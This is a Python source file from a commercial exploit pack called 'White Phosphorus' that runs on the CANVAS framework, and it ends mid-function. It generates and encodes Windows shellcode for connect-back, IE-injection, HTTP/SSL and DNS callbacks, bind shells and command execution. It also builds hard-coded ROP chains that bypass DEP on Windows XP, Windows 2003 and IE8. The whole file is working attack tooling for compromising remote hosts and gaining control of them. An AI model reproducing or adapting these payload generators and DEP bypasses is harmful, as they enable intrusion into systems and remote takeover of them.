
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
# This is the exploit pack library file so we are in control of shellcode
# generation and encoding.
#
# It is largely based on tcpexploit
######################################################################################

"""
wp_exploit.py
"""

CHANGELOG="""

"""
######################################################################################

import os,getopt
import sys
import socket
from struct import *
from exploitutils import *
from encoder import *
from tcpexploit import *

import traceback

import time
from shellcode import shellcodeGenerator, linuxshell
from linuxNode import linuxNode
from canvasexploit import canvasexploit

from shellcode import win32shell
from MOSDEF import mosdef as mosdef

from win32Node import win32Node
import win32MosdefShellServer
import canvasengine

from wp_osversions import osIsAtLeast
from wp_exploitutils import *
from wp_exploitcodeblocks import *


######################################################################################      
class wp_exploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)    

######################################################################################
# Generic usage handler
######################################################################################
    def wp_usage(self,targets,extras=""):
        print "---------------------------------------------------------------------"
        print "WP> White Phosphorus Exploit Pack"
        print "WP> %s"%self.name
        print "---------------------------------------------------------------------"
        print "Usage:"
        print "-T (check if target is vulnerable)"
        print "-v <version to target>"
        print "-t <target ip>\t -p <target port>"
        print "-l <callback ip> -d <callback port>"
        if extras != "":
            print extras
        print "\nPayload Options:"            
        print "-O payload:<#>   (will use default if not specified)"
        print "-O command:<cmd> (for Execute Command payload)"
        print "-O bind:<port>   (for Bind MOSDEF Shell)"
        print "\nVersions:"
        for t in targets.keys():
            print '%d: %s'%(t,targets[t][0])
        print "\nPayloads:"
        for i,p in enumerate(self.PAYLOADS):
            print '%d: %s'%(i,p)

        return        
        
######################################################################################
# OS Detection
###################################################################################### 
    def wp_autoVersionTarget(self, targets):
        self.log("WP> Autoversioning:")
        autotarget = 0
        self.autoVersioned = True
        osd = self.engine.getModuleExploit('osdetect')
        osd.link(self)
        if osd.run():
            os = osd.result
            for k, v in targets.iteritems():
                for wpos in v[2]:
                    if osIsAtLeast(wpos, os):
                        autotarget = k
                        break
                if autotarget != 0:
                    break

        if autotarget == 0:
            return 0

        return autotarget       

######################################################################################
# Listener handler generation
######################################################################################
    def wp_createWin32Listener(self):

        if getattr(self,'HTTPMOSDEF',False):
            if getattr(self,'useSSLMOSDEF',False):
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        elif getattr(self,'shell_TCPCONNECTBACK',False):
            if getattr(self, 'use_universal',False):
                return [canvasengine.UNIVERSAL_MOSDEF]
            else:
                return [canvasengine.WIN32MOSDEF]
        elif getattr(self,'shell_IECONNECTBACK',False):        
            if getattr(self, 'use_universal',False):
                return [canvasengine.UNIVERSAL_MOSDEF]
            else:
                return [canvasengine.WIN32MOSDEF]        
        elif getattr(self, 'shell_BINDSHELL',False):
            return []  
        elif getattr(self, 'shell_EXECCMD',False):
            return []              
        elif getattr(self,'shell_REUSESOCKET',False):        
            return []
        elif getattr(self,'shell_DNSMOSDEF',False):        
            return [canvasengine.DNSMOSDEF] 
        else:                
            return []  

######################################################################################
# Shellcode selection and handling
######################################################################################    
    def wp_getShellcodeType(self):
        # Command line options
        if not getattr(self, 'RunFromGUI',False):
            if self.argsDict.has_key("payload"):
                p =int(self.argsDict["payload"])
                self.argsDict["payloadType"] = self.PAYLOADS[p]
            else:
                self.argsDict["payloadType"] = self.PAYLOADS[self.DEFAULT_PAYLOAD]
            
            if self.argsDict.has_key("command"):
                p =self.argsDict["command"]
                self.argsDict["payloadExecCmd"] = p
                
            if self.argsDict.has_key("bind"):
                p =int(self.argsDict["bind"])
                self.argsDict["payloadBindPort"] = p            
        
        if self.argsDict.get('payloadType','') == 'TCP Connect Back':
            self.shell_TCPCONNECTBACK = True
        if self.argsDict.get('payloadType','') == 'IE Inject Connect Back':
            self.shell_IECONNECTBACK = True
        if self.argsDict.get('payloadType','') == 'HTTPMOSDEF SSL':
            self.HTTPMOSDEF = True
            self.useSSLMOSDEF = True
        if self.argsDict.get('payloadType','') == 'HTTPMOSDEF PLAIN':
            self.HTTPMOSDEF = True
            self.useSSLMOSDEF = False
        if self.argsDict.get('payloadType','') == 'Bind MOSDEF Shell':
            self.shell_BINDSHELL = True
            self.bindPort = self.argsDict.get('payloadBindPort',31337)
        if self.argsDict.get('payloadType','') == 'Execute Command':
            self.shell_EXECCMD = True
            self.execCMD = self.argsDict.get('payloadExecCmd','cmd /c')
        if self.argsDict.get('payloadType','') == 'Socket Reuse':
            self.shell_REUSESOCKET = True
        if self.argsDict.get('payloadType','') == 'DNS MOSDEF':
            self.shell_DNSMOSDEF = True

        return

    def wp_createShellcode(self):

        # All of our generators set self.shellcode.
        if getattr(self, 'shell_TCPCONNECTBACK',False):
            self.wp_createWin32ConnectShellcode()
        if getattr(self, 'shell_IECONNECTBACK',False):
            self.wp_createWin32InjectToSelf()            
        if getattr(self, 'HTTPMOSDEF',False):    
            self.wp_createWin32HTTPMOSDEFShellcode()
        if getattr(self, 'shell_BINDSHELL',False):    
            self.wp_createWin32BindShellcode()            
        if getattr(self, 'shell_EXECCMD',False):    
            self.wp_createWin32ExecCmdShellCode()   
        if getattr(self, 'shell_REUSESOCKET',False):    
            self.wp_createWin32GOShellcode()
        if getattr(self, 'shell_DNSMOSDEF',False):    
            self.wp_createWin32DNSMOSDEFShellcode()
        return self.shellcode	

    def wp_postExploitShellcode(self,socket=None,longGoTrigger = False):
        # If bind shell selected then attempt connection
        # Set longGoTrigger to True, to check for the longer GOOO string
        if getattr(self, 'shell_BINDSHELL',False):
            ret=self.win32NonCallbackShellcodeCheck()
            if ret: 
                self.setSucceeded()
                self.setInfo("WP> %s attacking %s:%d - done (success!)"%(self.name,self.host,self.port))
                return ret
            else:
                self.result_error=self.ERR_FAILED
                self.setProgress(-1)
        elif getattr(self, 'shell_REUSESOCKET',False):        
            self.setInfo("WP> Waiting for socket trigger")
            if self.checkTriggerWin32(socket,longGoTrigger):
                self.setSucceeded()
                self.setInfo("WP> %s attacking %s:%d - done (success!)"%(self.name,self.host,self.port))
                return self.doGOMOSDEFWin32(socket)

        return False


######################################################################################
# Shellcode Generators
######################################################################################

    def wp_createWin32ConnectShellcode(self):
        """

        Creates DEP Safe Win32 MOSDEF Callback Shellcode

        """

        self.log("WP> Generating Win32 Connect Back shellcode")
        self.log('WP> Connect back information: %s:%d' % (self.callback.ip, self.callback.port))

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip

        #Set self.vProtect = True to enable
        if getattr(self,'vProtect',False):
            sc.vProtectSelf = True
            self.log("WP> Enabling Shellcode vProtect")
        
        #Set self.suspendThreads = True to enable
        if getattr(self,'suspendThreads',False):
            sc.addAttr("SuspendThreads", None)
            self.log("WP> Enabling SuspendThreads")  
        
        #Set self.revertToSelf=False to prevent reverting
        if getattr(self,'revertToSelf',True):
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)  
            self.log("WP> Enabling RevertToSelf")
        else:
            self.log("WP> Disabling RevertToSelf")   
               
        sc.addAttr("tcpconnect", {"port" : self.callback.port, "ipaddress" : self.callback.ip})
        
        # Universal listener uses a bit more space, set self.use_universal = True to enable
        if getattr(self, 'use_universal',False):
            if getattr(self,'createThread',True):
                mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL_FCT)
            else:
                mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            
        #Set self.createThread=False to prevent spawning a new thread
        if getattr(self,'createThread',True):
            #spawn a new thread
            sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF        
            self.callback.argsDict['fromcreatethread'] = 1            
            sc.addAttr("ExitThread",None)
            
        else:
            #old style 
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            sc.addAttr("RecvExecDepSafe",None) # MOSDEF
            self.callback.argsDict['fromcreatethread'] = 0

        rawshellcode=sc.get()
        
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        #debug int
        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)
        return shellcode

    def wp_createWin32HTTPMOSDEFShellcode(self):
        """

        Creates Win32 HTTPMOSDEF Shellcode
        		Injects to IE and uses HTTP to communicate
        """

        self.log("WP> Generating Win32 HTTPMOSDEF capable shellcode")
        self.log('WP> Connect back information: %s:%d' % (self.callback.ip, self.callback.port))

        proxy_payload = ''
        try:
            # this stuff is only used when served in HTTP MOSDEF mode
            if getattr(self, 'HTTPMOSDEF',False):
                # make sure that fromcreatethread is set to 0 in your
                # httpserver/exploit listenerArgsDict!
                # http_proxy automaticall supports universal listener
                import shellcode.standalone.windows.payloads as payloads
                ssl_dict = { True : 'https', False : 'http' }
                p   = payloads.payloads(VistaCompat = True)

                sc  = p.http_proxy("%s://%s" % \
                                   (ssl_dict[self.useSSLMOSDEF],\
                                    self.callback.ip),\
                                   self.callback.port)
                proxy_payload = p.assemble(sc)
                if self.useSSLMOSDEF:
                    self.log("WP> Generated Win32 SSL HTTPMOSDEF stager code")
                else:
                    self.log("WP> Generated Win32 PLAIN HTTPMOSDEF stager code")

        except:
            proxy_payload = ''

        # based on the original createInjectToSelf  
        sc = shellcodeGenerator.win32()
        
        #Set self.vProtect = True to enable
        if getattr(self,'vProtect',False):
            sc.vProtectSelf = True
            self.log("WP> Enabling Shellcode vProtect")
            
        #Set self.suspendThreads = True to enable
        if getattr(self,'suspendThreads',False):
            sc.addAttr("SuspendThreads", None)
            self.log("WP> Enabling SuspendThreads")            
                    
        sc.addAttr("findeipnoesp", {"subespval": 0})
        if getattr(self, 'inject_dontexit',False):
            sc.addAttr("InjectToSelf", { "injectme" : proxy_payload, "DONTEXIT" : True, "customexit" : "jmp exit" }) 

            # This exithread is not needed if the InjectToSelf code calls ExitProcess
            sc.addAttr("ExitThread", None)
            
        else:
            sc.addAttr("InjectToSelf", { "injectme" : proxy_payload })

        rawshellcode=sc.get()
                
        self.log("WP> Generated Win32 IE Injection shellcode")
        
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)
        return shellcode

    def wp_createWin32InjectToSelf(self):
        """

        Creates Win32 Inject To IE Shellcode
        		This spawns IE and then starts a remote thread to connect back

        """

        self.log("WP> Generating Win32 IE Injection shellcode")
        self.log('WP> Connect back information: %s:%d' % (self.callback.ip,self.callback.port))
        
        # Create our connect back code
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        
        #Set self.revertToSelf=False to prevent reverting
        if getattr(self,'revertToSelf',True):
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)  
            self.log("WP> Enabling RevertToSelf")
        else:
            self.log("WP> Disabling RevertToSelf")    
        
        sc.addAttr("tcpconnect", {"port" : self.callback.port, "ipaddress" : self.callback.ip})
        
        # Universal listener uses a bit more space, set self.use_universal = True to enable
        if getattr(self, 'use_universal',False):
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
                    
        sc.addAttr("loadFDasreg", {"reg" : "esi"})
        sc.addAttr("RecvExecDepSafe",None) 
        sc.addAttr("ExitThread",None)
        self.callback.argsDict['fromcreatethread'] = 0
        proxy_payload = sc.get()        
        
        # based on the original createInjectToSelf  
        sc = shellcodeGenerator.win32()

        #Set self.vProtect = True to enable
        if getattr(self,'vProtect',False):
            sc.vProtectSelf = True
            self.log("WP> Enabling Shellcode vProtect")   
            
        #Set self.suspendThreads = True to enable
        if getattr(self,'suspendThreads',False):
            sc.addAttr("SuspendThreads", None)
            self.log("WP> Enabling SuspendThreads")                 
        
        sc.addAttr("findeipnoesp", {"subespval": 0})
        if getattr(self, 'inject_dontexit',False):
            sc.addAttr("InjectToSelf", { "injectme" : proxy_payload, "DONTEXIT" : True, "customexit" : "jmp exit" })

            # This exithread is not needed if the InjectToSelf code calls ExitProcess
            sc.addAttr("ExitThread", None)
            
        else:
            sc.addAttr("InjectToSelf", { "injectme" : proxy_payload }) 
        
        rawshellcode=sc.get()
        
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        #debug int
        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)

        return shellcode      

    def wp_createWin32BindShellcode(self):
        """

        Creates Win32 Bind Shellcode
        	 Exploit must call wp_win32NonCallbackShellcodeCheck to connect

        """

        self.log("WP> Generating Win32 Bind shellcode")
        self.log('WP> Bind Mosdef on port %s:%d' % (self.target.interface,self.bindPort))

        # Create Bind Shellcode
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp })

        #Set self.vProtect = True to enable
        if getattr(self,'vProtect',False):
            sc.vProtectSelf = True
            self.log("WP> Enabling Shellcode vProtect")
        
        #Set self.suspendThreads = True to Suspend Threads 
        if getattr(self,'suspendThreads',False):
            sc.addAttr("SuspendThreads", None)
            self.log("WP> Enabling SuspendThreads")          
        
        #Set self.revertToSelf=False to prevent reverting
        if getattr(self,'revertToSelf',True):
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            self.log("WP> Enabling RevertToSelf")
        else:
            self.log("WP> Disabling RevertToSelf")                      
        sc.addAttr("BindMosdef", {"port" : self.bindPort })
        
        #Set self.createThread=False to prevent spawning a new thread
        if getattr(self,'createThread',True):        
            #spawn a new thread
            sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF        
            sc.addAttr("ExitThread", None)
            #self.callback.argsDict['fromcreatethread'] = 1            
        else:
            #old style 
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            sc.addAttr("RecvExecDepSafe",None) # MOSDEF
            #self.callback.argsDict['fromcreatethread'] = 0

        rawshellcode=sc.get()
        
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        #debug int
        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)

        return shellcode

    def win32NonCallbackShellcodeCheck(self):
        """
        Tries to connect to a bind shellcode on the remote server
        returns our new Node on success, otherwise returns None

        """
        s = self.gettcpsock()
        try:
            self.log("WP> Attempting connection to Bind Mosdef on port %s:%d"%(self.target.interface,self.bindPort))
            s.connect((self.target.interface, self.bindPort))
        except:
            self.log("WP> Connection did not succeed to port %d"%self.bindPort)
            return None

        # got a connection, verify with GO handshake
        if self.checkTriggerWin32(s):
            self.log("WP> Got a Bind Mosdef socket!")
            node = win32Node()
            node.parentnode = self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(s, node,self.logfunction)
            #Need this if we use CreateThreadRecvExecWin32
            newshell.argsDict["fromcreatethread"] = 1
            newshell.node.startup()
            return newshell.node

        return None        

    def wp_createWin32ExecCmdShellCode(self):
        """

        Creates Win32 Exec Cmd Shellcode

        """

        self.log("WP> Generating Win32 Exec Command shellcode")
        self.log('WP> Running command: %s' % (self.execCMD))

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip

        #Set self.vProtect = True to enable
        if getattr(self,'vProtect',False):
            sc.vProtectSelf = True
            self.log("WP> Enabling Shellcode vProtect")
        
        #Set self.suspendThreads = True to Suspend Threads 
        if getattr(self,'suspendThreads',False):
            sc.addAttr("SuspendThreads", None)
            self.log("WP> Enabling SuspendThreads")  
                    
        #Set self.revertToSelf=False to prevent reverting
        if getattr(self,'revertToSelf',True):
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            self.log("WP> Enabling RevertToSelf")
        else:
            self.log("WP> Disabling RevertToSelf")              
            
        sc.addAttr("winexec", {"command" : self.execCMD })

        sc.addAttr("ExitThread", None)
                
        rawshellcode=sc.get()
        
        # Manually update to enable proper exit()
        # insert a jmp exit before the getfuncaddress:
        sc.code = sc.code.replace("getfuncaddress:","jmp exit\ngetfuncaddress:")
        # and assemble        
        rawshellcode=mosdef.assemble(sc.code,"X86")
                
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        #debug int
        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)

        return shellcode 

    def wp_createWin32GOShellcode(self):
        """

        Creates DEP Safe Win32 Socket Reuse Shellcode

        """

        self.log("WP> Generating Win32 Socket Reuse shellcode")

        sc=shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip

        #Set self.vProtect = True to enable
        if getattr(self,'vProtect',False):
            sc.vProtectSelf = True
            self.log("WP> Enabling Shellcode vProtect")

        #Set self.suspendThreads = True to Suspend Threads 
        if getattr(self,'suspendThreads',False):
            sc.addAttr("SuspendThreads", None)
            self.log("WP> Enabling SuspendThreads")          
        
        sc.addAttr("GOFindSock",{"startsock": getattr(self,'startsock',4)})	# Min here of 4 as internal code is x-4

        #old style 
        sc.addAttr("loadFDasreg", {"reg" : "esi"})
        sc.addAttr("RecvExecDepSafe",None) # MOSDEF
        #self.callback.argsDict['fromcreatethread'] = 0

        rawshellcode=sc.get()
        
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)

        return shellcode
    
    def wp_createWin32DNSMOSDEFShellcode(self):
        """

        Creates a Win32 DNSMOSDEF Shellcode

        """
        import shellcode.standalone.windows.payloads as payloads
        
        self.log("WP> Generating Win32 DNSMOSDEF shellcode")
        self.log("WP> Domain: %s"%self.domain)
        self.log('WP> Connect back information: %s:%d' % (self.callback.ip, self.callback.port))

        cd = "".join( [ random.choice(string.uppercase) for x in range(5) ] ) + '.'
        cd += "".join( [ random.choice(string.uppercase) for x in range(3) ] ) + '.'
        cd += self.domain
        
        p = payloads.payloads()
        sc = p.dns_proxy(cd, '192.168.4.1')
        rawshellcode = p.assemble(sc)
        
        if getattr(self,'alignstack',False):
            rawshellcode = wp_AlignStack() + rawshellcode
            self.log("WP> Enabling Stack Alignment")

        # encode the shellcode
        # Set self.useRawShellcode = True to disable
        if getattr(self,'useRawShellcode',False):
            shellcode = rawshellcode
        else:
            shellcode = self.wp_encodeShellcode(self.badstring,rawshellcode)

        # debug int
        # shellcode="\xcc"+shellcode       
        self.setShellcode(shellcode)
        self.shellcode_size = len(shellcode)
        return shellcode

######################################################################################
# Encoding
######################################################################################
    def wp_encodeShellcode(self, badstring, rawshellcode):
        
        if len(rawshellcode)==0:
            self.log("WP> Your shellcode is of length zero. This is most likely a bug in your exploit!")
            return 0

        if badstring=="":
            #no bad characters? Great!
            self.log( "WP> No encoding required")
            self.log("WP> Raw shellcode of length %d"%len(rawshellcode))
            shellcode = rawshellcode
        else:
            self.log( "WP> Encoding shellcode")
            
            if getattr(self,'encode_alphanumeric',False):
                shellcode=self.wp_intel_encode_alphanumeric(rawshellcode)
            elif getattr(self,'encode_printable',False):                
                shellcode=self.wp_intel_encode_printable(badstring,rawshellcode)                
            else:
                shellcode=self.wp_intel_encode(badstring, rawshellcode)

            if not shellcode:
                self.log("WP> Could not encode shellcode")
                return 0

            self.log("WP> Encoding complete. New length is %d bytes"%len(shellcode))

        return shellcode
        
    def wp_intel_encode_printable(self, badstring,rawshellcode):
        # Remeber that this encoder needs ESP==EIP
        from encoder import printable
        self.log("WP> Intel Printable Encoding raw shellcode of length %d"%len(rawshellcode))
        encoder         = printable.intelprintableencoder()
        encoder.setbadchars(badstring)
        shellcode=encoder.encode(rawshellcode)        

        return shellcode        
    
    def wp_intel_encode_alphanumeric(self, rawshellcode):
        # Need to set reg to us (THIS IS NOT COMPLETED)

        self.log("WP> Intel AlphaNumeric Encoding raw shellcode of length %d"%len(rawshellcode))
        encoder         = alphanumeric.AlphaNum()
        totopc          = encoder.seh_pc() # leaves pc in ecx
        getpc           = encoder.get_pc(reg='ecx')
        payload         = encoder.encode(rawshellcode)
        shellcode  = totopc + getpc + payload
        return shellcode
    

    def wp_intel_encode(self, badstring, rawshellcode, subesp=0, minimumchunklength=80):
        """
        Encodes the shellcode with the badstring
        tries xor and additive and chunked additive encoder

        The size restriction of the XOR encoder has been removed as it is the fastest.
        """

        self.log("WP> Intel Encoding raw shellcode of length %d"%len(rawshellcode))
        if len(badstring) == 0:
            self.log("WP> Encoding not needed")
            return rawshellcode
        #here we check to see if we are LIKELY to find a
        #good XOR encoder - otherwise we will waste a lot
        #of time doing nothing useful
        if (len(badstring)*len(rawshellcode))<30000:
            self.log("WP> Trying xor encoder")
            enc=xorencoder.simpleXOR()
            enc.subesp=subesp
            enc.setbadstring(badstring)
            ret=enc.find_key(rawshellcode)
            if ret==0:
                self.log("WP> Could not generate XOR key for this shellcode!")
            else:
                encodedshellcode=enc.encode(rawshellcode)
                if encodedshellcode:
                    return encodedshellcode
        if (len(badstring)*len(rawshellcode))<5000:
            self.log("WP> Trying additive encoder")
            #Then try intel additive encoder
            encoder=addencoder.inteladdencoder()
            encoder.maxguesses=5000
            encoder.setbadstring(badstring)
            encodedshellcode=encoder.encode(rawshellcode)

            if encodedshellcode:
                self.log("WP> Used additive encoder")
                return encodedshellcode

        #otherwise we always try chunked encoder
        self.log("WP> Using chunked encoder (minimum chunk of %d)"%minimumchunklength)
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        if len(badstring)>5:
            #130 is very slow, 80 is quite fast
            #but 80 will generate very large shellcode!
            encoder.minimumchunklength=minimumchunklength
        encoder.setbadstring(badstring)
        shellcode = encoder.encode(rawshellcode)
        if shellcode: 
            self.log("WP> Used chunked additive encoder")
            return shellcode
        self.log("WP> Chunked additive encoder failed")
        return None

######################################################################################
# Windows DEP bypass
######################################################################################


    def wp_UniversalDEPBypassWin2k3_VP(self,size=2200):
        # White Phosphorus 
        # Universal DEP Bypass for Windows 2003 SP1/SP2 using VirtualProtect Version 3
        # Base on Jayji's work
        # This routine will make the current ESP + size bytes of the stack frame executable and then return to the stack
        # Uses VirtualProtect
        # Default size is enough for the SSL HTTPProxy, but doesn't include any STACK BUFFER space
        
        size = size + 48  # This is the size of the DEP bypass + ptr in relation to the initial ESP ptr used
                          # This is calculated from the final call to PUSH ESP, POP ESI to where the shellcode is.
                
        self.log("WP> Building Universal Windows 2003 DEP bypass using VirtualProtect")
        depBypass =""
        depBypass += pack('<L', 0x77BE8B31)  	# PUSH ESP, POP ESI  - Store page in ESI
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BAF38E)  	# MOV EAX, ESI       - Move page into EAX
        depBypass += wp_randomstring(24)        #                    - Padding
        depBypass += pack('<L', 0x77BC5F6C)  	# ADD EAX, 58 / RETN - Point page further down stack
        depBypass += pack('<L', 0x77BCC397)  	# ADD EAX, 2C / RETN - Point page further down stack
        depBypass += wp_randomstring(4)         #                    - Padding       
        depBypass += pack('<L', 0x77BAF7CD)  	# ADD EAX, 0C / RETN - Point page further down stack
        depBypass += pack('<L', 0x77BDCA9B)  	# XCHG EAX, EDI      - Move page to EDI for storage
        depBypass += pack('<L', 0x77BB2563)  	# POP EAX       - Prepare for calculation
        depBypass += pack('<L', 0x22222222)  	# EAX value
        depBypass += pack('<L', 0x77BB1C65)  	# POP ECX (was 0x77BAFB3A)
        
        size = 0x22222222 - size              # This is the size calculation
        while hasbadchar(size,self.badstring):
            size -= 1
            
        depBypass += pack('<L', size & 0xffffffff) # Our ESI Adjustment for size         
        depBypass += pack('<L', 0x77BD87CA)  	# Sub EAX,ECX  - Do size calculation
        depBypass += pack('<L', 0x77BEABB4)  	# STOSD              - Set dwSize                 
        depBypass += pack('<L', 0x77BAF410)  	# XOR EAX, EAX       - Set EAX to null
        depBypass += pack('<L', 0x77BDFC1D)  	# ADD EAX, 40        - Set EAX to 40
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BEABB4)  	# STOSD              - Set PAGE_EXECUTE_READWRITE
        depBypass += pack('<L', 0x77BB2563)  	# POP EAX, RET       - Load Writeable address address for STOSD
        depBypass += pack('<L', 0x77BF5F20)  	#                    - Writeable address
        depBypass += pack('<L', 0x77BEABB4)  	# STOSD              - Set lpflOldProtect
        depBypass += pack('<L', 0x77BDCA9B)  	# XCHG EAX, EDI      - Move stored page to eax
        depBypass += pack('<L', 0x77BBF2FF)  	# XCHG EBP, EAX      - Move stored page into ebp controlling where we return from VirtualProtect
        depBypass += pack('<L', 0x77BE8B31)  	# PUSH ESP, POP ESI  - Set lpAddress
        depBypass += wp_randomstring(4)         #                    - Padding
        depBypass += pack('<L', 0x77BEABB5)  	# RETN               -
        depBypass += wp_randomstring(16)        #                    - Padding
        depBypass += pack('<L', 0x77BBCCBC)  	#                    - Call VirtualProtect
        depBypass += wp_randomstring(16)        #                    - Padding
        depBypass += pack('<L', 0x77BE2265)  	# PUSH ESP / RETN    - Return on to our shellcode... Profit!

        self.depBypass_size = len(depBypass)
        self.log("WP> Universal DEP Bypass Size: %d Bytes" % self.depBypass_size) 
        return depBypass

######################################################################################        

    def wp_UniversalDEPBypassWinXP_VP(self,size=2200,version=0):
        # White Phosphorus 
        # Universal DEP Bypass for Windows XP SP2/SP3 using VirtualProtect Version 2
        # Base on Jayji's work
        # This routine will make the current ESP + size bytes of the stack frame executable and then return to the stack
        # Uses VirtualProtect
        #
        # Default size is enough for the SSL HTTPProxy, but doesn't include any STACK BUFFER space
        
        size = size + 96  # This is the size of the DEP bypass + ptr in relation to the initial ESP
        
        self.log("WP> Building Universal Windows XP DEP bypass using VirtualProtect")
        depBypass =""
        depBypass += pack('<L', 0x77C21A55) # XOR EAX,EAX
        depBypass += pack('<L', 0x77C36A28) # Load ESP into EBX
        depBypass += wp_randomstring(4)     # Buffer
        depBypass += pack('<L', 0x77C3EDD9) # (Loaded into ESI) Move EBX into EAX, and restore EBX
        depBypass += wp_randomstring(4)     # Buffer        
        depBypass += pack('<L', 0x77C35F7A) # Push EBX, Call ESI
        depBypass += wp_randomstring(4)     # Buffer                
        depBypass += pack('<L', 0x77C34FCB) # Add EAX,58 to move down shellcode
        depBypass += pack('<L', 0x77C23933) # Mov EAX into EBP (Can't change EBP past here)
        depBypass += pack('<L', 0x77C21D16) # Pop EAX value
        depBypass += pack('<L', 0x11111111)	# EAX value
        depBypass += pack('<L', 0x77C1F519)	# Pop ECX value 
        depBypass += pack('<L', 0x111110D1)	# ECX value4
        depBypass += pack('<L', 0x77C478FA)	# Sub EAX,ECX 
        depBypass += pack('<L', 0x77C2C849) # Populate the correct registers to prepare for call
        
        size = size - 0x77C35F7D            # This is the size calculation (77C35F7D is already in EAX from CALL above)
        while hasbadchar(size,self.badstring):
            size += 1
            
        depBypass += pack('<L', size & 0xffffffff) # Our ESI Adjustment for size 
        depBypass += pack('<L', 0x77C14490) # Add EAX,ESI
        depBypass += wp_randomstring(16)    # Buffer                
        depBypass += pack('<L', 0x77C23B47)	# Pop EDI, RET
        depBypass += pack('<L', 0x77C22665)	# Pop EDI, POP ESI, Ret (Used by call below)
        if (version==0):
            depBypass += pack('<L', 0x77C2DC9E) # Push EAX, Call EDI (Some apps have issues with the \x9E)
        elif (version==1):
            depBypass += pack('<L', 0x77C2E26E) # Push EAX, Call EDI 


        depBypass += pack('<L', 0x77C2C0A9)	# The VirtualProtect Call
        depBypass += pack('<L', 0x77C35459)	# Push ESP, Retn
        
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal DEP Bypass Size: %d Bytes" % self.depBypass_size) 
        return depBypass
    
######################################################################################        

    def wp_mscorieDEPBypass(self,size=2200):
        # White Phosphorus 
        # Universal DEP Bypass for IE8
        # 
        # Using the .net2.0 loading of mscorie.dll which is not aslr aware
        # This method was publically disclosed in http://xcon.xfocus.net/XCon2010_ChenXie_EN.pdf
        #
        # Default size is enough for the SSL HTTPProxy
        
        size = size + 76  # This is the size of the DEP bypass + ptr in relation to the initial ESP
        
        # depbypass using mscorie
        # Clever trick using PUSHAD to get the current ESP location into the params        
